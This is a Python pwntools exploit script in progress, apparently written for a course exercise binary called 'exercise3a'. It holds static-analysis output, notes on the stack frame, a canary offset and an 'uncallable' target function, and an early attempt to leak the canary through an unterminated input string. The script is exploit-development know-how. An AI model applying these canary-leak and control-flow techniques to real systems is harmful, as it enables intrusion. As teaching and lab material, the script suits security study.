#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise3/exercise3a'
exe = './exercise3a'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
#Static analysis
'''
arch     x86
baddr    0x400000
binsz    15315
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
#method uncallable @ 0x00401256
#check_authorization allocates 0xe0 = 224 bytes of the stack for its frame
#the canary is located at rbp - 0x14 = rbp - 20 bytes (observe it's right in the middle of a stackslot -> 32 bit canary value)

print(r.recvline()) #Enter the secret password\n

read_int_value = b"AAAA" #(224 - 20 - len(" is not the password\n")) * b"A"
r.sendline(read_int_value) #is uses sys.readLine(), so the input string is not terminated with \x00
test = r.recvline() #Well of course [%s] is not the password\n[32 bit canary value]
print(test)
print("Output1: ", end="")
print(r.recvline())
print("Output2: ", end="")
print(r.recvline())